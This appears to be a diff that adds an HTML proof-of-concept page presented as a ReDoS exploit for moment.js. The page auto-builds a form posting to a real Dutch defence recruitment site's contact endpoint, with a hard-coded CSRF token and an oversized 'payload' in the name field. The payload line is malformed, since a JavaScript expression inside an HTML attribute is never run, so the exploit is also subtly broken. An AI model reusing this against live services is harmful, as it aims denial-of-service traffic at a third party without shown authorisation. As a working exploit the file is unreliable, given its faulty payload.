@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ReDoS PoC</title>
+</head>
+<body>
+    <h1>Exploit for ReDoS Vulnerability in moment.js</h1>
+    <form action="https://werkenbijdefensie.nl/contact/stuur-een-mail" method="POST">
+        <input type="hidden" name="_token" value="5Jw4KkMmM504YnScRuXOOs0XYV3HnfybQqHZzO5w">
+        <input type="hidden" name="date_of_birth_day" value="03">
+        <input type="hidden" name="date_of_birth_month" value="01">
+        <input type="hidden" name="date_of_birth_year" value="1999">
+        <input type="hidden" name="internal_education_id" value="12">
+        <input type="hidden" name="armed_force_id" value="10">
+        
+        <!-- Injecting the ReDoS payload in the "name" field -->
+        <input type="text" name="name" value="(".repeat(500000)" />
+        <input type="text" name="email" value="test@example.com" />
+        <input type="text" name="subject" value="Testing ReDoS" />
+        <textarea name="body">Testing ReDoS vulnerability</textarea>
+        <input type="text" name="zipcode" value="12345" />
+        <input type="text" name="phone_number" value="1964501380" />
+        <textarea name="body_vacancy">Testing ReDoS vulnerability</textarea>
+        
+        <input type="submit" value="Submit">
+    </form>
+</body>
+</html>
